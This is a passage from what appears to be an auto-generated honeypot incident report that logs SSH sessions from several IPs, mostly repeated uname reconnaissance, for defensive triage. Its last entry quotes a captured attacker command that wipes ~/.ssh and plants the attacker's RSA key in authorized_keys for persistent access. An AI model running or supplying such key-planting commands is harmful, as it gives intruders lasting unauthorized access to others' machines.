| `2026-08-25 04:55:09` | `cowrie.log.closed` |
| `2026-08-25 04:55:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-996a81d50146

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 04:55 |
| **Last Seen** | 2026-08-25 04:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:55:13` | `cowrie.session.connect` |
| `2026-08-25 04:55:13` | `cowrie.client.version` |
| `2026-08-25 04:55:13` | `cowrie.client.kex` |
| `2026-08-25 04:55:13` | `cowrie.login.success` |
| `2026-08-25 04:55:14` | `cowrie.session.params` |
| `2026-08-25 04:55:14` | `cowrie.command.input` |
| `2026-08-25 04:55:14` | `cowrie.log.closed` |
| `2026-08-25 04:55:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2222c415ef8b

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 04:55 |
| **Last Seen** | 2026-08-25 04:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:55:17` | `cowrie.session.connect` |
| `2026-08-25 04:55:17` | `cowrie.client.version` |
| `2026-08-25 04:55:17` | `cowrie.client.kex` |
| `2026-08-25 04:55:18` | `cowrie.login.success` |
| `2026-08-25 04:55:19` | `cowrie.session.params` |
| `2026-08-25 04:55:19` | `cowrie.command.input` |
| `2026-08-25 04:55:19` | `cowrie.log.closed` |
| `2026-08-25 04:55:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-510b15016153

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 04:55 |
| **Last Seen** | 2026-08-25 04:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:55:22` | `cowrie.session.connect` |
| `2026-08-25 04:55:22` | `cowrie.client.version` |
| `2026-08-25 04:55:22` | `cowrie.client.kex` |
| `2026-08-25 04:55:22` | `cowrie.login.success` |
| `2026-08-25 04:55:23` | `cowrie.session.params` |
| `2026-08-25 04:55:23` | `cowrie.command.input` |
| `2026-08-25 04:55:23` | `cowrie.log.closed` |
| `2026-08-25 04:55:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53d3780e08de

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 04:55 |
| **Last Seen** | 2026-08-25 04:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:55:27` | `cowrie.session.connect` |
| `2026-08-25 04:55:27` | `cowrie.client.version` |
| `2026-08-25 04:55:27` | `cowrie.client.kex` |
| `2026-08-25 04:55:27` | `cowrie.login.success` |
| `2026-08-25 04:55:28` | `cowrie.session.params` |
| `2026-08-25 04:55:28` | `cowrie.command.input` |
| `2026-08-25 04:55:28` | `cowrie.log.closed` |
| `2026-08-25 04:55:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97cb4715cff2

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 04:55 |
| **Last Seen** | 2026-08-25 04:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:55:32` | `cowrie.session.connect` |
| `2026-08-25 04:55:32` | `cowrie.client.version` |
| `2026-08-25 04:55:32` | `cowrie.client.kex` |
| `2026-08-25 04:55:32` | `cowrie.login.success` |
| `2026-08-25 04:55:33` | `cowrie.session.params` |
| `2026-08-25 04:55:33` | `cowrie.command.input` |
| `2026-08-25 04:55:33` | `cowrie.log.closed` |
| `2026-08-25 04:55:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ad64cdbdf82

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 04:55 |
| **Last Seen** | 2026-08-25 04:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:55:37` | `cowrie.session.connect` |
| `2026-08-25 04:55:37` | `cowrie.client.version` |
| `2026-08-25 04:55:37` | `cowrie.client.kex` |
| `2026-08-25 04:55:37` | `cowrie.login.success` |
| `2026-08-25 04:55:38` | `cowrie.session.params` |
| `2026-08-25 04:55:38` | `cowrie.command.input` |
| `2026-08-25 04:55:38` | `cowrie.log.closed` |
| `2026-08-25 04:55:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bba0bcf8cd65

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-25 04:55 |
| **Last Seen** | 2026-08-25 04:55 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:55:38` | `cowrie.session.connect` |
| `2026-08-25 04:55:38` | `cowrie.client.version` |
| `2026-08-25 04:55:38` | `cowrie.client.kex` |
| `2026-08-25 04:55:40` | `cowrie.login.success` |
| `2026-08-25 04:55:41` | `cowrie.session.params` |
| `2026-08-25 04:55:41` | `cowrie.command.input` |
| `2026-08-25 04:55:41` | `cowrie.command.input` |
| `2026-08-25 04:55:41` | `cowrie.command.input` |
| `2026-08-25 04:55:41` | `cowrie.command.input` |
| `2026-08-25 04:55:41` | `cowrie.command.input` |
| `2026-08-25 04:55:41` | `cowrie.command.success` |
| `2026-08-25 04:55:41` | `cowrie.command.input` |
| `2026-08-25 04:55:41` | `cowrie.command.input` |
| `2026-08-25 04:55:41` | `cowrie.command.input` |
| `2026-08-25 04:55:41` | `cowrie.command.input` |
| `2026-08-25 04:55:41` | `cowrie.log.closed` |
| `2026-08-25 04:55:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b81a4701e199

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 04:55 |
| **Last Seen** | 2026-08-25 04:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:55:41` | `cowrie.session.connect` |
| `2026-08-25 04:55:41` | `cowrie.client.version` |
| `2026-08-25 04:55:42` | `cowrie.client.kex` |
| `2026-08-25 04:55:42` | `cowrie.login.success` |
| `2026-08-25 04:55:43` | `cowrie.session.params` |
| `2026-08-25 04:55:43` | `cowrie.command.input` |
| `2026-08-25 04:55:43` | `cowrie.log.closed` |
| `2026-08-25 04:55:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc11b70f6c4b

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 04:55 |
| **Last Seen** | 2026-08-25 04:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:55:46` | `cowrie.session.connect` |
| `2026-08-25 04:55:46` | `cowrie.client.version` |
| `2026-08-25 04:55:46` | `cowrie.client.kex` |
| `2026-08-25 04:55:46` | `cowrie.login.success` |
| `2026-08-25 04:55:47` | `cowrie.session.params` |
| `2026-08-25 04:55:47` | `cowrie.command.input` |
| `2026-08-25 04:55:47` | `cowrie.log.closed` |
| `2026-08-25 04:55:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-651a4b8016b8

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 04:55 |
| **Last Seen** | 2026-08-25 04:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:55:51` | `cowrie.session.connect` |
| `2026-08-25 04:55:51` | `cowrie.client.version` |
| `2026-08-25 04:55:51` | `cowrie.client.kex` |
| `2026-08-25 04:55:51` | `cowrie.login.success` |
| `2026-08-25 04:55:52` | `cowrie.session.params` |
| `2026-08-25 04:55:52` | `cowrie.command.input` |
| `2026-08-25 04:55:52` | `cowrie.log.closed` |
| `2026-08-25 04:55:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bbbf8ded1b6e

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 04:55 |
| **Last Seen** | 2026-08-25 04:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:55:55` | `cowrie.session.connect` |
| `2026-08-25 04:55:55` | `cowrie.client.version` |
| `2026-08-25 04:55:55` | `cowrie.client.kex` |
| `2026-08-25 04:55:56` | `cowrie.login.success` |
| `2026-08-25 04:55:57` | `cowrie.session.params` |
| `2026-08-25 04:55:57` | `cowrie.command.input` |
| `2026-08-25 04:55:57` | `cowrie.log.closed` |
| `2026-08-25 04:55:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-643b99c233d7

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 04:56 |
| **Last Seen** | 2026-08-25 04:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:56:00` | `cowrie.session.connect` |
| `2026-08-25 04:56:00` | `cowrie.client.version` |
| `2026-08-25 04:56:00` | `cowrie.client.kex` |
| `2026-08-25 04:56:00` | `cowrie.login.success` |
| `2026-08-25 04:56:01` | `cowrie.session.params` |
| `2026-08-25 04:56:01` | `cowrie.command.input` |
| `2026-08-25 04:56:02` | `cowrie.log.closed` |
| `2026-08-25 04:56:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e41366cbe48

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 04:56 |
| **Last Seen** | 2026-08-25 04:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:56:05` | `cowrie.session.connect` |
| `2026-08-25 04:56:05` | `cowrie.client.version` |
| `2026-08-25 04:56:05` | `cowrie.client.kex` |
| `2026-08-25 04:56:05` | `cowrie.login.success` |
| `2026-08-25 04:56:06` | `cowrie.session.params` |
| `2026-08-25 04:56:06` | `cowrie.command.input` |
| `2026-08-25 04:56:06` | `cowrie.log.closed` |
| `2026-08-25 04:56:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81429a100309

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 04:56 |
| **Last Seen** | 2026-08-25 04:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:56:09` | `cowrie.session.connect` |
| `2026-08-25 04:56:09` | `cowrie.client.version` |
| `2026-08-25 04:56:09` | `cowrie.client.kex` |
| `2026-08-25 04:56:09` | `cowrie.login.success` |
| `2026-08-25 04:56:10` | `cowrie.session.params` |
| `2026-08-25 04:56:10` | `cowrie.command.input` |
| `2026-08-25 04:56:10` | `cowrie.log.closed` |
| `2026-08-25 04:56:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e48a3b6a1b5

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 04:56 |
| **Last Seen** | 2026-08-25 04:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:56:14` | `cowrie.session.connect` |
| `2026-08-25 04:56:14` | `cowrie.client.version` |
| `2026-08-25 04:56:14` | `cowrie.client.kex` |
| `2026-08-25 04:56:14` | `cowrie.login.success` |
| `2026-08-25 04:56:15` | `cowrie.session.params` |
| `2026-08-25 04:56:15` | `cowrie.command.input` |
| `2026-08-25 04:56:15` | `cowrie.log.closed` |
| `2026-08-25 04:56:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52d65abe9cee

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 04:56 |
| **Last Seen** | 2026-08-25 04:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:56:19` | `cowrie.session.connect` |
| `2026-08-25 04:56:19` | `cowrie.client.version` |
| `2026-08-25 04:56:19` | `cowrie.client.kex` |
| `2026-08-25 04:56:19` | `cowrie.login.success` |
| `2026-08-25 04:56:20` | `cowrie.session.params` |
| `2026-08-25 04:56:20` | `cowrie.command.input` |
| `2026-08-25 04:56:20` | `cowrie.log.closed` |
| `2026-08-25 04:56:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7b083e22ed3

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 04:56 |
| **Last Seen** | 2026-08-25 04:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:56:24` | `cowrie.session.connect` |
| `2026-08-25 04:56:24` | `cowrie.client.version` |
| `2026-08-25 04:56:24` | `cowrie.client.kex` |
| `2026-08-25 04:56:24` | `cowrie.login.success` |
| `2026-08-25 04:56:25` | `cowrie.session.params` |
| `2026-08-25 04:56:25` | `cowrie.command.input` |
| `2026-08-25 04:56:25` | `cowrie.log.closed` |
| `2026-08-25 04:56:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f4c8671aba2

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 04:56 |
| **Last Seen** | 2026-08-25 04:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:56:28` | `cowrie.session.connect` |
| `2026-08-25 04:56:28` | `cowrie.client.version` |
| `2026-08-25 04:56:28` | `cowrie.client.kex` |
| `2026-08-25 04:56:29` | `cowrie.login.success` |
| `2026-08-25 04:56:29` | `cowrie.session.params` |
| `2026-08-25 04:56:29` | `cowrie.command.input` |
| `2026-08-25 04:56:30` | `cowrie.log.closed` |
| `2026-08-25 04:56:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30d5841d2f24

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 04:56 |
| **Last Seen** | 2026-08-25 04:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:56:33` | `cowrie.session.connect` |
| `2026-08-25 04:56:33` | `cowrie.client.version` |
| `2026-08-25 04:56:34` | `cowrie.client.kex` |
| `2026-08-25 04:56:34` | `cowrie.login.success` |
| `2026-08-25 04:56:35` | `cowrie.session.params` |
| `2026-08-25 04:56:35` | `cowrie.command.input` |
| `2026-08-25 04:56:35` | `cowrie.log.closed` |
| `2026-08-25 04:56:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c04eb5ed946

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 04:56 |
| **Last Seen** | 2026-08-25 04:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:56:38` | `cowrie.session.connect` |
| `2026-08-25 04:56:38` | `cowrie.client.version` |
| `2026-08-25 04:56:38` | `cowrie.client.kex` |
| `2026-08-25 04:56:39` | `cowrie.login.success` |
| `2026-08-25 04:56:40` | `cowrie.session.params` |
| `2026-08-25 04:56:40` | `cowrie.command.input` |
| `2026-08-25 04:56:40` | `cowrie.log.closed` |
| `2026-08-25 04:56:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00d02cd78989

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 04:56 |
| **Last Seen** | 2026-08-25 04:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:56:43` | `cowrie.session.connect` |
| `2026-08-25 04:56:43` | `cowrie.client.version` |
| `2026-08-25 04:56:43` | `cowrie.client.kex` |
| `2026-08-25 04:56:43` | `cowrie.login.success` |
| `2026-08-25 04:56:44` | `cowrie.session.params` |
| `2026-08-25 04:56:44` | `cowrie.command.input` |
| `2026-08-25 04:56:44` | `cowrie.log.closed` |
| `2026-08-25 04:56:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9670969c45cc

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 04:56 |
| **Last Seen** | 2026-08-25 04:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:56:47` | `cowrie.session.connect` |
| `2026-08-25 04:56:47` | `cowrie.client.version` |
| `2026-08-25 04:56:47` | `cowrie.client.kex` |
| `2026-08-25 04:56:48` | `cowrie.login.success` |
| `2026-08-25 04:56:49` | `cowrie.session.params` |
| `2026-08-25 04:56:49` | `cowrie.command.input` |
| `2026-08-25 04:56:49` | `cowrie.log.closed` |
| `2026-08-25 04:56:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28a1f51bfb20

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 04:56 |
| **Last Seen** | 2026-08-25 04:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:56:52` | `cowrie.session.connect` |
| `2026-08-25 04:56:52` | `cowrie.client.version` |
| `2026-08-25 04:56:52` | `cowrie.client.kex` |
| `2026-08-25 04:56:53` | `cowrie.login.success` |
| `2026-08-25 04:56:54` | `cowrie.session.params` |
| `2026-08-25 04:56:54` | `cowrie.command.input` |
| `2026-08-25 04:56:54` | `cowrie.log.closed` |
| `2026-08-25 04:56:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b31c6fb3a5de

| Field | Detail |
|---|---|
| **Source IP** | `165.154.147[.]69` |
| **First Seen** | 2026-08-25 04:56 |
| **Last Seen** | 2026-08-25 04:57 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

